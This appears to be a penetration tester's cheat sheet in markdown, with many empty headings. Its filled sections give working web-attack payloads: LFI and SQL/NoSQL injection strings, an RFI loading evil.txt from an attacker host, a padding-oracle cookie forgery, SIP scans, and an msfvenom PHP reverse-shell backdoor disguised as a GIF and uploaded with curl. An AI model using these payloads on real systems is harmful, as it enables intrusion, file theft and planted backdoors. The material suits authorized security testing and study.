# Exploiting Vulnerabilities

## Finding Exploits

---

##### Search Exploit-DB

##### Search Google

##### Search Metasploit

##### Search Vulners

## Compiling Exploits

---

##### Compile for Windows

##### Compile for Architectures

## Breaking out of Virtualization

---

##### Resources

## WebSockets

---

##### Resources

## HTTP

---

##### Resources

##### Headers

> ###### Send fake IP

```
Kali> curl --header "X-Forwarded-For: 192.168.1.1" http://$TARGET
```

##### XXE

##### XSS

##### CSRF

##### SSRF

##### Command Injection

##### LFI

> ###### Resources

###### [https://www.exploit-db.com/docs/40992.pdf](https://www.exploit-db.com/docs/40992.pdf)

> ###### Examples

```
file:///etc/passwd
../../../etc/passwd
php://filter/convert.base64-encode/resource=admin.php
php://filter/convert.base64-encode/resource=../../../../../etc/passwd
php://input
    send post data
expect://whoami
```

##### RFI

> ###### External File

```
Kali> echo "<?php phpinfo(); ?>" > evil.txt
http://$TARGET/index.php?path=http://$ATTACKER/evil.txt
```

> ###### Internal Resource

```
# Sometimes RFI can lead to viewing internal resources, here are some commands to help
# enumerate all the things

# Port scan the internal resources available
Kali> wfuzz -c -z range,1-65535 --filter "l>2" http://$TARGET/proxy.php?path=localhost:FUZZ

# If you find one, dirbust it.
Kali> wfuzz -c -w /usr/share/wordlists/dirb/big.txt --filter "l>11" http://$TARGET:8080
```

##### Padding Oracle Attack

> ###### Resources

[https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)

> ###### Arguments

```
url - first argument is the URL
encrpted - second argument is the encrypted text
bits - third argument is the number of bits per block
-cookies - define a cookie to use
-plaintext - plaintext to encrypt
```

> ###### Examples

```
Kali> padBuster.pl http://$TARGET "ENC-COOKIE-TEXT" 8
                                -cookies "ENC-COOKIE"
                                -plaintext '{"user":"admin","role":"admin"}'
```

##### File Upload

> ###### Make a backdoor GIF

```
# As a note, try to overwrite the magic bytes of your backdoor with a valid image
# so that the check will validate. This includes Content-Type.
Kali> msfvenom --list | grep php
Kali> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.15.237 LPORT=54321 -o evil.php
Kali> echo “FFD8FFEo” | xxd -r -p > evil.gif
Kali> cat evil.php >> evil.gif
```

> ###### Upload From CLI

```
Kali> curl -X POST
                -F "field1=test"
                -F "file=@/home/user/evil.gif"
                http://$TARGET/upload.php
                --cookie "cookie"
```

## E-Mail

---

##### Resources

[https://www.youtube.com/watch?v=eZxWDCetqkE](https://www.youtube.com/watch?v=eZxWDCetqkE)

## iSCSI

---

##### Resources

[https://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/](https://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/)

## Databases

---

##### MySQL

> ###### Resources

[https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)

[https://www.trustwave.com/Resources/SpiderLabs-Blog/Sqlmap-Tricks-for-Advanced-SQL-Injection/](https://www.trustwave.com/Resources/SpiderLabs-Blog/Sqlmap-Tricks-for-Advanced-SQL-Injection/)

###### Examples

```
username'--
1'||'1'<'2
'OR 1=1;--
'OR 1=1;#
'OR 1=1 LIMIT 1; #
AND 1 = 2 UNION SELECT 1,2,3,4,5
1'1
1 exec sp_ (or exec xp_)
1 and 1=1
1' and 1=(select count(*) from tablenames); --
1 or 1=1
1' or '1'='1
1or1=1
1'or'1'='1
fake@ema'or'il.nl'='il.nl
1 union all select 1,2,3,4,load_file("/etc/passwd"),6
1 union all select 1,2,3,4,"<?php ?>",6 into outfile '/var/www/html/backdoor.php'
```

##### MSSQL

> ###### Resources

[http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)

[https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/](https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/)

##### MongoDB

> ###### Resources

[https://github.com/codingo/NoSQLMap](https://github.com/codingo/NoSQLMap)

> ###### Examples

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
```

## PBX

---

##### Resources

[https://www.backtrack-linux.org/wiki/index.php/Pentesting\_VOIP](https://www.backtrack-linux.org/wiki/index.php/Pentesting_VOIP)

##### Examples

```
Kali> svmap $TARGET
Kali> svwar -m INVITE -eSTART-END $TARGET
```



